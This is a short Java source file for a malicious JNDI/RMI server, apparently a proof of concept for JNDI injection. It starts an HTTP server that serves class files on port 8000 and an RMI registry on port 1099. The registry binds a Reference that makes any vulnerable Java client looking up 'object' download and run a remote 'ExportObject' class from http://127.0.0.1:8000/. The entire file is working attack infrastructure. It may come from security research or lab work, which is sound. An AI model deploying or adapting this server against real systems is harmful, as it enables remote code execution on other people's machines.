import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.net.httpserver.HttpServer;

import javax.naming.Reference;
import java.net.InetSocketAddress;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {

    public static void main(String[] args) throws Exception {
        System.out.println("Starting HTTP server");
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0);
        httpServer.createContext("/",new HttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();

        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("ExportObject",
                "ExportObject","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("object",referenceWrapper);
    }
}